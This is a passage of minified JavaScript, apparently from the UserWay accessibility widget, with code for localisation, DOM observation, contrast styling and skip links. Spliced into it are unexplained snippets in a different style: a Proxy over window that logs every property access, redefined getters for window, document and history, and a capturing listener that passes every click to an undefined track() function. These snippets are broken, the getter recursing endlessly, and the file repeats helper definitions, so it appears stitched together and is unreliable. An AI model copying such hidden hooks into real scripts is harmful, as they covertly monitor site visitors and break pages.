      vw: Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0),
      vh: Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0)
    };
  }, N.getDiffPercentage = function (e, t) {
    return Math.abs(e - t) / ((e + t) / 2) * 100;
  }, N.getStyles = function (e) {
    return e ? window.getComputedStyle(e) : {};
  }, N.isTransparentElement = function (e) {
    var t = N.getStyles(e),
      i = t.background,
      n = t.opacity;
    return /(^(rgb\())|(^(:?rgba).*(:?255\))$)/.test(i) || "1" !== n;
  }, N.isNotDefaultCssFlow = function (e, t) {
    void 0 === t && (t = ["absolute", "fixed"]);
    var i = N.getStyles(e).position;
    return t.includes(i);
  }, N.isOverlayElement = function (e, t) {
    var i = N.getViewport(),
      n = i.vw,
      a = i.vh,
      r = e.offsetWidth,
      o = e.offsetHeight,
      s = N.getDiffPercentage(n, r),
      u = N.getDiffPercentage(a, o);
    if (s > 25 && u > 25) {
      return [].slice.call(e.getElementsByTagName("*")).forEach(function (e) {
        e.matches(t.join(",")) || e.setAttribute("data-uw-feature-ignore", "true");
      }), !0;
    }
    return !1;
  }, N.ignoreMaterialUI = function (e) {
    var t = I(e),
      i = t.materialInputLabelContainer,
      n = t.materialInputLabelContainerDescendants;
    return !(!i && !n) && (i && i.setAttribute("data-uw-feature-ignore", "true"), !0);
  }, N.filterTransparentPositionedElements = function (e, t) {
    void 0 === t && (t = []);
    var i = e.matches(t.join(",")),
      n = window.getComputedStyle(e),
      a = "fixed" === n.position,
      r = N.isNotDefaultCssFlow(e) && !N.isTransparentElement(e) && !i;
    return !!N.ignoreMaterialUI(e) || (r && (a ? e.setAttribute("data-uw-feature-ignore", "true") : r = N.isOverlayElement(e, t)), !r);
  }, N.getHtmlElement = function () {
    var e = this.getElementsByTagName("html");
    return e && e.length && e[0] ? e[0] : null;
  }, N.filterIgnoredElems = function (e) {
    return !e.hasAttribute("data-uw-feature-ignore");
  }, N.isOpenShadowRoot = function (e) {
    if (e) return !!e.shadowRoot;
  }, N.isOpenShadowNode = function (e) {
    if (e) return e.getRootNode() instanceof ShadowRoot;
  }, N.removeFeatureStyles = function (e) {
    var t = e.element,
      i = e.activeCssClass,
      n = e.key,
      a = e.inlineStyles;
    t.classList.remove(i), R.resetInlineStyles(t, n, a);
  }, N.getShadowRootChildren = function (e, t) {
    return void 0 === t && (t = "*"), e.shadowRoot.querySelectorAll(t);
  }, Math.imul || (Math.imul = function (e, t) {
    t |= 0;
    var i = (4194303 & e) * t;
    return 4290772992 & e && (i += (4290772992 & e) * t | 0), 0 | i;
  }), N.execForDocumentAndIframes = O, N.downloadFile = C, N.hasParentWithAttribute = function (e, t) {
    var i,
      n,
      a = document.querySelectorAll("[" + t + "]");
    try {
      for (var r = __values(a), o = r.next(); !o.done; o = r.next()) {
        var s = o.value;
        if (s === e || s.contains(e)) return !0;
      }
    } catch (e) {
      i = {
        error: e
      };
    } finally {
      try {
        o && !o.done && (n = r.return) && n.call(r);
      } finally {
        if (i) throw i.error;
      }
    }
    return !1;
  }, N.focusHostDocument = function () {
    if (N.isSafari) {
      var e = document.createElement("input");
      e.type = "text", e.style.opacity = "0", e.style.height = "0px", e.style.width = "0px", e.style.padding = "0px", e.style.border = "none", e.style.outline = "none", e.style.pointerEvents = "none", document.body.appendChild(e), e.focus({
        preventScroll: !0
      }), e.remove();
    }
  }, N.debounce = function (e, t) {
    function i() {
      clearTimeout(a);
    }
    function n() {
      i(), a = setTimeout(function () {
        e();
      }, t);
    }
    var a = null;
    return n.cancel = i, n;
  }, N.formatLangCode = function (e) {
    return e && e.replace(/(^\w+)([-|_|,])(\w+$)/, function (e, t, i, n) {
      return t.toLowerCase() + i + n.toUpperCase();
    });
  }, N.onElementVisible = function (e, t) {
    new IntersectionObserver(function (i, n) {
      i.forEach(function (i) {
        i.intersectionRatio > 0 && (t(e), n.disconnect());
      });
    }).observe(e);
  }, N.findAllElements = function (e) {
    var t = ["a", "altGlyph", "altGlyphDef", "altGlyphItem", "animate", "animateColor", "animateMotion", "animateTransform", "circle", "clipPath", "cursor", "defs", "desc", "discard", "ellipse", "feBlend", "feColorMatrix", "feComponentTransfer", "feComposite", "feConvolveMatrix", "feDiffuseLighting", "feDisplacementMap", "feDistantLight", "feDropShadow", "feFlood", "feFuncA", "feFuncB", "feFuncG", "feFuncR", "feGaussianBlur", "feImage", "feMerge", "feMergeNode", "feMorphology", "feOffset", "fePointLight", "feSpecularLighting", "feSpotLight", "feTile", "feTurbulence", "filter", "font", "font-face", "font-face-format", "font-face-name", "font-face-src", "font-face-uri", "foreignObject", "g", "glyph", "glyphRef", "hatch", "hatchpath", "hkern", "image", "line", "linearGradient", "marker", "mask", "mesh", "meshgradient", "meshpatch", "meshrow", "metadata", "missing-glyph", "mpath", "path", "pattern", "polygon", "polyline", "radialGradient", "rect", "script", "set", "solidcolor", "stop", "style", "svg", "switch", "symbol", "text", "textPath", "title", "tref", "tspan", "unknown", "use", "view", "vkern"],
      i = __spreadArray([], __read(t.map(function (e) {
        return "svg " + e;
      })), !1);
    return e.querySelectorAll("*|*:not(" + i.join(",") + ")");
  };
}();
var LS_KEY = "uw-icon-locales",
  CDN_BASE = "https://cdn.userway.org/",
  LOCALES = "widgetapp/2023-11-28-09-17-49/locales/",
  VERSION = "2023-11-28-09-17-49";
!function () {
  function e(e) {
    var t = i();
    return t && t[e] ? Promise.resolve() : new Promise(function (t, i) {
      a.request({
        method: "GET",
        url: CDN_BASE + LOCALES + e + ".json"
      }).then(function (i) {
        i && i.response && (n(e, JSON.parse(i.response)), t(""));
      }, function (e) {
        console.warn("Can't load localization resources."), i(e);
      });
    });
  }
  function t(e, t) {
    if (!e) return "";
    var n = i();
    if (n && n[e]) {
      return t.split(".").reduce(function (e, t) {
        return e && e[t];
      }, n[e]);
    }
    return "";
  }
  function i() {
    var e = window.localStorage.getItem(LS_KEY);
    if (!e) return null;
    var t = JSON.parse(e);
    return t.version !== VERSION ? (window.localStorage.removeItem(LS_KEY), null) : t;
  }
  function n(e, t) {
    var n = i() || {
      version: VERSION
    };
    n[e] = t, window.localStorage.setItem(LS_KEY, JSON.stringify(n));
  }
  var a = UserWayWidgetApp.getLib("util"),
    r = UserWayWidgetApp.addLib("localization_manager");
  Object.assign(r, {
    initializeLocale: e,
    translate: t
  });
}();
var __values = this && this.__values || function (e) {
  var t = "function" == typeof Symbol && Symbol.iterator,
    i = t && e[t],
    n = 0;
  if (i) return i.call(e);
  if (e && "number" == typeof e.length) return {
    next: function () {
      return e && n >= e.length && (e = void 0), {
        value: e && e[n++],
        done: !e
      };
    }
  };
  throw new TypeError(t ? "Object is not iterable." : "Symbol.iterator is not defined.");
};
!function () {
  var e = [],
    t = {
      next: function (t) {
        var i, n;
        try {
          for (var a = __values(e), r = a.next(); !r.done; r = a.next()) {
            (0, r.value)(t);
          }
        } catch (e) {
          i = {
            error: e
          };
        } finally {
          try {
            r && !r.done && (n = a.return) && n.call(a);
          } finally {
            if (i) throw i.error;
          }
        }
      },
      subscribe: function (t) {
        return e.push(t), function () {
          e = e.filter(function (e) {
            return e !== t;
          });
        };
      },
      unsubscribe: function (t) {
        e = e.filter(function (e) {
          return e !== t;
        });
      },
      unsubscribeAll: function () {
        e = [];
      }
    };
  window.messageStream = t;
  var i = UserWayWidgetApp.addLib("message-stream");
  Object.assign(i, t);
}();
const JSHOOK = "__jsTrackingHook__";
window[JSHOOK] = new Proxy(window, {
  has: (target, prop) => {
    track('has', prop);
    return Reflect.has(target, prop);
  },
  get: (target, prop) => {
    track('get', prop);
    return Reflect.get(target, prop);
  },
  set: (target, prop, value) => {
    track('set', prop);
    Reflect.set(target, prop, value);
  }
});
var __read = this && this.__read || function (e, t) {
    var i = "function" == typeof Symbol && e[Symbol.iterator];
    if (!i) return e;
    var n,
      a,
      r = i.call(e),
      o = [];
    try {
      for (; (void 0 === t || t-- > 0) && !(n = r.next()).done;) o.push(n.value);
    } catch (e) {
      a = {
        error: e
      };
    } finally {
      try {
        n && !n.done && (i = r.return) && i.call(r);
      } finally {
        if (a) throw a.error;
      }
    }
    return o;
  },
  __spreadArray = this && this.__spreadArray || function (e, t, i) {
    if (i || 2 === arguments.length) for (var n, a = 0, r = t.length; a < r; a++) !n && a in t || (n || (n = Array.prototype.slice.call(t, 0, a)), n[a] = t[a]);
    return e.concat(n || Array.prototype.slice.call(t));
  };
!function () {
  function e(e, t) {
    var i = "/" === e[0] ? e.slice(1) : e,
      n = i.split("/");
    return n.map(function (e, i) {
      var a = e.toLowerCase(),
        r = __read(a.match(/(\S+)\[(\S+)?\]/) || [, a], 3),
        o = r[1],
        s = r[2],
        u = n.length - 1 === i,
        l = {
          idx: i,
          tag: o
        };
      return s && (l.position = +s), u && t && (l.params = t), l;
    });
  }
  function t(e, t, i) {
    return void 0 === i && (i = !1), e.reduce(function (e, n) {
      var a = i && n.position ? ":nth-of-type(" + n.position + ")" : "";
      return e += n.tag + a + (n.idx >= t ? ">" : " ");
    }, "").slice(0, -1);
  }
  function i(e, i) {
    void 0 === i && (i = 4);
    var a,
      r = e.length - d - i,
      o = e[e.length - 1],
      s = o.params;
    if (r < 0) {
      a = t(e, 0, !0);
      var u = n(a, s, o);
      return u || (a = t(e, 0), n(a, s, o));
    }
    var l;
    !function (e) {
      e[e.Strict = 0] = "Strict", e[e.Medium = 1] = "Medium", e[e.Loose = 2] = "Loose";
    }(l || (l = {}));
    for (var c = [l.Strict, l.Medium, l.Loose], p = 0; p < c.length; p++) {
      var f = function (u) {
        var c;
        for (r = e.length - d - i; r >= 0; r--) {
          a = u === l.Loose ? t((c = e.slice(0, 2)).concat.apply(c, __spreadArray([], __read(e.slice(-r - i)), !1)), e.length - i) : t(e, e.length - i - r - 1, u === l.Strict);
          var p = n(a, s, o);
          if (p) return p;
        }
      }(c[p]);
      if (f) return f;
    }
    return null;
  }
  function n(e, t, i) {
    var n = r(e);
    if (1 === n.length) {
      if (null == i.params) return n[0];
      if (a(n[0], t)) return n[0];
    }
    if (n.length > 1) {
      if (null == i.params) return null;
      var o = n.filter(function (e) {
        return a(e, t);
      });
      if (1 === o.length) return o[0];
    }
    return null;
  }
  function a(e, t) {
    if (null == t) return !0;
    var i = e.innerText ? u.hashString(e.innerText).toString() : "";
    if (t.innerText.toString() !== i) return !1;
    var n = e.hasAttribute("href") ? u.hashString(e.getAttribute("href")).toString() : "";
    if (t.href && t.href !== n) return !1;
    var a = e.hasAttribute("src") ? u.hashString(e.getAttribute("src")).toString() : "";
    return !t.src || t.src === a;
  }
  function r(e) {
    return Array.prototype.slice.call(document.querySelectorAll(e));
  }
  function o(t) {
    var n = c(t);
    return i(e(n.xpath, n.params));
  }
  var s = window.UserWayWidgetApp.addLib("xpath_search"),
    u = window.UserWayWidgetApp.getLib("util"),
    l = {
      i: "innerText",
      s: "src",
      h: "href"
    },
    d = 2;
  s.recursiveXpathSearch = o;
  var c = function (e) {
    var t = __read(e.split("|"), 2),
      i = t[0],
      n = t[1],
      a = {
        innerText: ""
      };
    if (n) {
      var r = __read(n.split(";")),
        o = r[0],
        s = r.slice(1);
      a.innerText = o, s.forEach(function (e) {
        var t = __read(e.split(":"), 2),
          i = t[0],
          n = t[1];
        a[l[i]] = n;
      });
    }
    return {
      xpath: i,
      params: a
    };
  };
  s.getByXpath = function (e) {
    var t = c(e),
      i = t.xpath,
      n = t.params,
      r = document.evaluate(i, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
    return a(r, n) ? r : null;
  };
}(), function () {
  function e() {}
  function t(e, t) {
    for (var i = e.length; i--;) if (e[i].listener === t) return i;
    return -1;
  }
  function i(e) {
    var t,
      i,
      n = this._getEvents();
    if (e instanceof RegExp) {
      t = {};
      for (i in n) n.hasOwnProperty(i) && e.test(i) && (t[i] = n[i]);
    } else t = n[e] || (n[e] = []);
    return t;
  }
  function n(e) {
    var t,
      i = this.getListeners(e);
    return i instanceof Array && (t = {}, t[e] = i), t || i;
  }
  function a(e) {
    return "function" == typeof e || e instanceof RegExp || !(!e || "object" != typeof e) && a(e.listener);
  }
  function r(e, i) {
    if (!a(i)) throw new TypeError("listener must be a function");
    var n,
      r = this.getListenersAsObject(e),
      o = "object" == typeof i;
    for (n in r) r.hasOwnProperty(n) && -1 === t(r[n], i) && r[n].push(o ? i : {
      listener: i,
      once: !1
    });
    return this;
  }
  function o(e, i) {
    var n,
      a,
      r = this.getListenersAsObject(e);
    for (a in r) r.hasOwnProperty(a) && -1 !== (n = t(r[a], i)) && r[a].splice(n, 1);
    return this;
  }
  function s(e, t) {
    var i,
      n,
      a,
      r,
      o = this.getListenersAsObject(e);
    for (r in o) if (o.hasOwnProperty(r)) for (i = o[r].slice(0), a = 0; a < i.length; a++) n = i[a], !0 === n.once && this.removeListener(e, n.listener), n.listener.apply(this, t || []);
    return this;
  }
  function u(e) {
    var t = Array.prototype.slice.call(arguments, 1);
    return this.emitEvent(e, t);
  }
  function l() {
    return this._events || (this._events = {});
  }
  var d = e.prototype;
  d.getListeners = i, d.getListenersAsObject = n, d.addListener = r, d.on = r, d.removeListener = o, d.off = o, d.emitEvent = s, d.emit = u, d._getEvents = l;
  window.UserWayWidgetApp.addLib("event_emitter", new e());
}(), function () {
  function e() {
    var e,
      r,
      o,
      s = window[t].ContextHolder.config,
      u = null !== (r = Number(null === (e = null === s || void 0 === s ? void 0 : s.tunings) || void 0 === e ? void 0 : e.tech_do_throttle_ms)) && void 0 !== r ? r : 250,
      l = [],
      d = [],
      c = function () {
        o || (o = setTimeout(function () {
          n.emitEvent(i.DOM_OBSERVER_DOM_CHANGED_EVENT, [window[t].ContextHolder.config, l, d]), l = [], d = [], clearTimeout(o), o = null;
        }, u));
      },
      p = function (e, t) {
        for (var i = 0; i < e.length; i++) {
          var n = e[i];
          if ("childList" === n.type) {
            var a = [].slice.call(n.addedNodes).filter(function (e) {
                return -1 === ["SCRIPT", "STYLE"].indexOf(e.tagName) && "function" == typeof e.hasAttribute && !e.hasAttribute("data-uw-rm-ignore");
              }),
              r = [].slice.call(n.removedNodes).filter(function (e) {
                return -1 === ["SCRIPT", "STYLE"].indexOf(e.tagName) && "function" == typeof e.hasAttribute && !e.hasAttribute("data-uw-rm-ignore");
              });
            if (l = l.concat(a), d = d.concat(r), !d.length && !l.length) continue;
            c();
          }
        }
      };
    a = new MutationObserver(p), document.body && a.observe(document.body, {
      subtree: !0,
      childList: !0
    });
  }
  var t = "UserWayWidgetApp",
    i = window[t].addLib("dom_observer"),
    n = window[t].getLib("event_emitter");
  i.DOM_OBSERVER_DOM_CHANGED_EVENT = "UW_EVT1";
  var a;
  i.initializeDomChangesObserver = function () {
    window[t].ContextHolder.config.isLH || e();
  };
}();
const GLOBAL_VARS = ["window", "document", "history"];
GLOBAL_VARS.forEach(varName => {
  Object.defineProperty(window, varName, {
    get: function () {
      track("getVar", varName);
      return this[varName];
    }
  });
});
window.addEventListener('click', function (event) {
  track('click-hook', event);
}, true);
var __values = this && this.__values || function (e) {
    var t = "function" == typeof Symbol && Symbol.iterator,
      i = t && e[t],
      n = 0;
    if (i) return i.call(e);
    if (e && "number" == typeof e.length) return {
      next: function () {
        return e && n >= e.length && (e = void 0), {
          value: e && e[n++],
          done: !e
        };
      }
    };
    throw new TypeError(t ? "Object is not iterable." : "Symbol.iterator is not defined.");
  },
  __read = this && this.__read || function (e, t) {
    var i = "function" == typeof Symbol && e[Symbol.iterator];
    if (!i) return e;
    var n,
      a,
      r = i.call(e),
      o = [];
    try {
      for (; (void 0 === t || t-- > 0) && !(n = r.next()).done;) o.push(n.value);
    } catch (e) {
      a = {
        error: e
      };
    } finally {
      try {
        n && !n.done && (i = r.return) && i.call(r);
      } finally {
        if (a) throw a.error;
      }
    }
    return o;
  },
  __spreadArray = this && this.__spreadArray || function (e, t, i) {
    if (i || 2 === arguments.length) for (var n, a = 0, r = t.length; a < r; a++) !n && a in t || (n || (n = Array.prototype.slice.call(t, 0, a)), n[a] = t[a]);
    return e.concat(n || Array.prototype.slice.call(t));
  };
!function () {
  function e(e, t, i) {
    (t.length || i.length) && (o = !0);
  }
  function t(e) {
    var t,
      i,
      n = a.getIframes(),
      r = n.filter(function (e) {
        return !!e.body && e.body.nodeType === Node.ELEMENT_NODE;
      }).map(function (e) {
        return a.instantiateTreeWalker(e.body, e);
      }),
      o = new Set(),
      s = new Set(),
      u = [],
      c = a.instantiateTreeWalker(e);
    if (null === e || void 0 === e ? void 0 : e.documentElement) try {
      for (var p = __values(e.documentElement.querySelectorAll("*")), f = p.next(); !f.done; f = p.next()) {
        var y = f.value;
        a.isOpenShadowRoot(y) && u.push(a.instantiateTreeWalker(y.shadowRoot));
      }
    } catch (e) {
      t = {
        error: e
      };
    } finally {
      try {
        f && !f.done && (i = p.return) && i.call(p);
      } finally {
        if (t) throw t.error;
      }
    }
    return r.splice.apply(r, __spreadArray([0, 0, c], __read(u), !1)), r.forEach(function (e) {
      for (var t = e.nextNode(); t;) {
        if (a.hasTextContent(t)) {
          var i = t.parentNode;
          i && o.add(i), s.add(t);
        }
        t = e.nextNode();
      }
    }), a.execForDocumentAndIframes(function () {
      var e = this.querySelectorAll("input, select, textarea");
      [].forEach.call(e, function (e) {
        var t = (e.getAttribute("type") || "").toLowerCase(),
          i = e.tagName.toLowerCase();
        (d.includes(t) || l.includes(i) || "input" === i && !t) && o.add(e);
      });
    }), {
      textNodes: __spreadArray([], __read(s), !1),
      elementsWithText: __spreadArray([], __read(o), !1)
    };
  }
  var i = UserWayWidgetApp.getLib("event_emitter"),
    n = UserWayWidgetApp.getLib("dom_observer"),
    a = UserWayWidgetApp.getLib("util"),
    r = n.DOM_OBSERVER_DOM_CHANGED_EVENT,
    o = !0,
    s = {
      textNodes: [],
      elementsWithText: []
    },
    u = UserWayWidgetApp.addLib("helpers.elements_with_text");
  u.init = function () {
    i.on(r, e);
  }, u.getElementsWithText = function (e, i) {
    if (void 0 === i && (i = !0), i && s.elementsWithText) return s.elementsWithText;
    if (!o) return s.elementsWithText;
    var n = t(e),
      a = n.textNodes,
      r = n.elementsWithText;
    return o = !1, s = {
      textNodes: a,
      elementsWithText: r
    }, r;
  }, u.getTextNodes = function (e, i) {
    if (void 0 === i && (i = !0), i && s.textNodes) return s.textNodes;
    if (!o) return s.textNodes;
    var n = t(e),
      a = n.textNodes,
      r = n.elementsWithText;
    return o = !1, s = {
      textNodes: a,
      elementsWithText: r
    }, a;
  };
  var l = ["textarea", "select"],
    d = ["text", "password", "submit", "reset", "button", "date", "datetime-local", "email", "file", "month", "number", "search", "tel", "time", "url", "week"];
}(), function () {
  var e = UserWayWidgetApp.getLib("helpers.elements_with_text"),
    t = UserWayWidgetApp.addLib("helpers");
  t.initialized = !1, t.init = function () {
    t.initialized || (e.init(), t.ElementsWithText = {
      getElementsWithText: e.getElementsWithText,
      getTextNodes: e.getTextNodes
    }, t.initialized = !0);
  };
}(), function () {
  function e() {
    var e = ["account", "position", "size", "language", "color", "type", "statement_text", "statement_url", "mobile", "trigger", "ai_custom_focus_style_enabled", "tts-voice"];
    if ("undefined" == typeof _userway_config || !_userway_config) {
      var t = null;
      if (window._userway_config = {}, t = document.querySelector("#" + a), t && t.hasAttribute("data-account") && (window._userway_config.account = t.getAttribute("data-account")), !t || !window._userway_config.account) {
        for (var i = document.querySelectorAll("script"), n = 0; n < i.length; n++) {
          if ("break" === function (e) {
            if (["cdn.shopify.com", "userway.dev", "userway.org", "usrwy.com", "accessibilityserver.org", "localhost", "gia.edu"].filter(function (t) {
              return !!i[e].src && -1 !== i[e].src.indexOf(t) && -1 !== i[e].src.indexOf("/widget.js");
            }).length > 0) return t = i[e], "break";
          }(n)) break;
        }
        if (t) {
          for (var r = t.attributes, n = r.length; n--;) {
            var o = r[n],
              s = 0 === o.name.indexOf("data") ? o.name.replace(/(^data-)/i, "") : o.name;
            s && e.indexOf(s) > -1 && ("type" !== s || ["1", "2", "3", "4"].indexOf(o.value) > -1) && (window._userway_config[s] = o.value);
          }
          if (!window._userway_config.account) for (var u = t.src, l = u.split("?").pop().split("&"), d = 0; d < l.length; d++) {
            var c = l[d].split("=");
            "platfAppInstalledSiteId" === c[0] && c[1] ? window._userway_config.platfAppInstalledSiteId = c[1] : e.indexOf(c[0]) > -1 && c[1] && (window._userway_config[c[0]] = c[1]);
          }
        }
      }
    }
  }
  var t = "UserWayWidgetApp",
    i = window[t].addLib("context_setter"),
    n = window[t].getLib("util"),
    a = "a11yWidgetSrc";
  i.initializeConfig = function () {
    function i() {
      var e = {};
      return [2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 23, 24, 25, 101, 102, 103, 104, 105, 106, 107, 108].forEach(function (t) {
        e["userway-s" + t] = {
          value: 0,
          disabled: !1
        };
      }), e;
    }
    function a() {
      var e = {
        _userway_config: _userway_config,
        browser: n.detectBrowser(),
        isMobile: n.isMobile(),
        isLH: n.isLightHouse(),
        supportsLocalStorage: n.supportsLocalStorage(),
        href: n.getHref(),
        account: _userway_config.account || _userway_config.code,
        origin: window.location.origin,
        iconType: "1",
        language: "en-US",
        languageHardcoded: null,
        reader: {
          enabled: !0,
          language: null,
          voice_locale: null
        },
        async: !1,
        settings: i(),
        tunings: {},
        partner: null,
        cdn: "https://cdn.userway.org/"
      };
      return window[t].ContextHolder.config = e, e;
    }
    return new Promise(function (t, i) {
      e(), "undefined" != typeof _userway_config && _userway_config ? t(a()) : setTimeout(function () {
        e(), t(a());
      }, 2e3);
    });
  };
}(), function () {
  function e(e) {
    var t = a.find(function (t) {
      return t.element === e;
    });
    return t || (t = new o(e), a.push(t)), t;
  }
  function t(t, i, n) {
    try {
      var a = e(t);
      a.applyStyles(n, i), a.element.setAttribute("data-" + i + "-styled", !0);
    } catch (e) {
      !!console.log && console.log("applyInlineStyles error. Element: " + t);
    }
  }
  function i(t, i, n) {
    try {
      var a = e(t);
      a.resetStyles(n, i), a.element.removeAttribute("data-" + i + "-styled");
    } catch (e) {
      !!console.log && console.log("resetInlineStyles error. Element: " + t);
    }
  }
  var n = window.UserWayWidgetApp.addLib("inlineStyling");
  n.featureStyles = {
    highlinks: {
      inlineStyles: {
        "text-decoration": "underline",
        color: "#ffff00",
        "background-color": "#000000"
      },
      inlineImgStyles: {
        "box-sizing": "border-box",
        border: "1px solid #ffff00"
      },
      svgStyle: {
        "background-color": "#000000",
        fill: "#ffff00"
      }
    },
    contrast: {
      dark: {
        key: "userway-s3-2",
        forATag: {
          "background-color": "#000000",
          "border-color": "#ffffff",
          color: "#fcff3c",
          svg: {
            "background-color": "#000000",
            fill: "#fcff3c"
          }
        },
        normal: {
          "background-color": "#000000",
          "border-color": "#ffffff",
          color: "#50d0a0"
        },
        svgImg: {
          "background-color": "#000000",
          fill: "#ffffff"
        }
      },
      light: {
        key: "userway-s3-3",
        forATag: {
          "background-color": "#ffffff",
          "border-color": "#000000",
          color: "#0000D3",
          svg: {
            "background-color": "#ffffff",
            fill: "#0000D3"
          }
        },
        normal: {
          "background-color": "#ffffff",
          "border-color": "#000000",
          color: "#000000"
        },
        svgImg: {
          "background-color": "#ffffff",
          fill: "#000000"
        }
      }
    }
  };
  var a = [],
    r = {
      "userway-s6": ["userway-s3-2", "userway-s3-3", "uw-sr", "data-uw-rm-color-contrast"],
      "userway-s3-2": ["userway-s6", "uw-sr", "data-uw-rm-color-contrast"],
      "userway-s3-3": ["userway-s6", "uw-sr", "data-uw-rm-color-contrast"],
      "uw-sr": ["userway-s3-2", "userway-s3-3", "userway-s6", "data-uw-rm-color-contrast"],
      "data-uw-rm-color-contrast": ["userway-s6", "userway-s3-2", "userway-s3-3", "uw-sr"]
    },
    o = function () {
      function e(e) {
        this.element = e, this.initialStylesText = e.style.cssText, this.initialStyles = this.parseStylesToObject(e), this.listOfApplyiedStylesKeys = [], this.appliedStyles = {}, this.appliedStylesByFeature = {}, this.transition = window.getComputedStyle(this.element).getPropertyValue("transition");
      }
      return e.prototype.parseStylesToObject = function (e) {
        var t = e.style.cssText.split(";"),
          i = {};
        return t.splice(t.length - 1, 1), t.forEach(function (e) {
          var t = e.substring(0, e.indexOf(":")).trim(),
            n = e.substring(e.indexOf(":") + 1);
          n = n ? n.trim() : null, i[t] = n;
        }), i;
      }, e.prototype.addStyleToAppliedListKeys = function (e) {
        this.listOfApplyiedStylesKeys.unshift(e);
      }, e.prototype.removeStyleFromAppliedListKeys = function (e) {
        var t = this.listOfApplyiedStylesKeys.indexOf(e);
        -1 !== t && this.listOfApplyiedStylesKeys.splice(t, 1);
      }, e.prototype.removeStyleFromAppliedStylesByFeature = function (e) {
        delete this.appliedStylesByFeature[e];
      }, e.prototype.resetStylesToInitial = function () {
        this.element.style.cssText = this.initialStylesText;
      }, e.prototype.applyStyles = function (e, t) {
        var i = this;
        this.appliedStylesByFeature[t] = e, e && (Object.keys(e).forEach(function (n) {
          i.appliedStyles[n] = {
            featureThatApply: t,
            value: e[n],
            oldValue: i.initialStyles[n]
          }, i.element.style.setProperty(n, e[n], "important"), i.element.style.setProperty("transition", i.transition);
        }), -1 === this.listOfApplyiedStylesKeys.indexOf(t) && this.addStyleToAppliedListKeys(t));
      }, e.prototype.resetStyles = function (e, t) {
        var i = this;
        Object.keys(e).forEach(function (e) {
          if (i.appliedStyles[e] && i.appliedStyles[e].featureThatApply === t) {
            i.element.style.setProperty("transition", "all 0s ease 0s"), i.element.style.setProperty(e, void 0 === i.appliedStyles[e].oldValue ? "" : i.appliedStyles[e].oldValue), delete i.appliedStyles[e];
            if ("background-color" === e || "background" === e) {
              var n = i.initialStyles.background && "background" || i.initialStyles["background-color"] && "background-color";
              if (!n) return;
              var a = i.initialStyles[n].split("!");
              a.length >= 2 ? i.element.style.setProperty(n, a[0].trim(), "important") : i.element.style.setProperty(n, i.initialStyles[n]);
            }
          }
        }), this.removeStyleFromAppliedListKeys(t), this.removeStyleFromAppliedStylesByFeature(t), r[t] && this.listOfApplyiedStylesKeys.length && r[t].forEach(function (e) {
          var t = i.listOfApplyiedStylesKeys.find(function (t) {
            return t === e;
          });
          if (t) {
            var n = i.getStylesForFeature(t);
            if (n && i.applyStyles(n, t), window.location.pathname === atob("L3dwcy9wb3J0YWwvUHJlcGFpZENhcmRTZWxmQ2FyZQ==")) {
              var a = {
                "background-image": "none"
              };
              i.applyStyles(a, atob("dXctcmFrYmFuay1maXg="));
            }
          }
        });
      }, e.prototype.getStylesForFeature = function (e) {
        var t;
        switch (e) {
          case "userway-s3-2":
          case "userway-s3-3":
            var i = "userway-s3-2" === e ? "dark" : "light";
            t = "A" === this.element.tagName ? n.featureStyles.contrast[i].forATag : n.featureStyles.contrast[i].normal;
            break;
          case "userway-s6":
            t = "IMG" === this.element.tagName ? n.featureStyles.highlinks.inlineImgStyles : n.featureStyles.highlinks.inlineStyles;
            break;
          default:
            t = this.appliedStylesByFeature[e];
        }
        return t;
      }, e;
    }();
  n.applyInlineStyles = t, n.resetInlineStyles = i;
}(), function () {
  function e() {
    a = !0;
    var r = [],
      o = [];
    n.emitEvent(i.IS_MOUSE_USER_EVENT, [window[t].ContextHolder.config, r, o]), document.removeEventListener("mousemove", e);
  }
  var t = "UserWayWidgetApp",
    i = window[t].addLib("user_input_type"),
    n = window[t].getLib("event_emitter"),
    a = !1;
  i.IS_MOUSE_USER_EVENT = "IS_MOUSE_USER", document.addEventListener("mousemove", e);
}(), function () {
  function e() {
    var e = g.config,
      n = i();
    n.filter(function (e) {
      return e;
    }), m = n[1], (!w || g.config.services.MODIFY_MENU && -1 === g.config.services.MODIFY_MENU.features_pattern.split("|").indexOf("s11")) && (n = n.filter(function (e) {
      return e.id !== k.openNavMenu;
    }));
    var a = t();
    a.setAttribute("aria-label", L(e.language, "skip_links.title") || "Quick Accessibility Options"), n.forEach(function (e, t) {
      var i = document.createElement("button");
      i.className = "uw-sl__item", i.setAttribute("data-uw-rm-ignore", "true"), i.setAttribute("data-uw-ignore-translate", "true"), i.setAttribute("lang", e.language), i.id = e.id;
      var n = document.createElement("span");
      n.className = "uw-sl__item__left", n.setAttribute("data-uw-ignore-translate", "true");
      var r = document.createElement("span");
      r.className = "uw-sl__item__img", r.innerHTML = e.img, n.appendChild(r);
      var s = document.createElement("span");
      s.className = "uw-sl__item__title", s.setAttribute("data-uw-ignore-s17", ""), s.setAttribute("data-uw-rm-ignore", "true"), s.setAttribute("data-uw-ignore-translate", "true");
      var u = c() && e.altTitle ? e.altTitle : e.title;
      s.innerHTML = u, i.setAttribute("aria-label", u), n.appendChild(s), i.appendChild(n);
      var l = document.createElement("span");
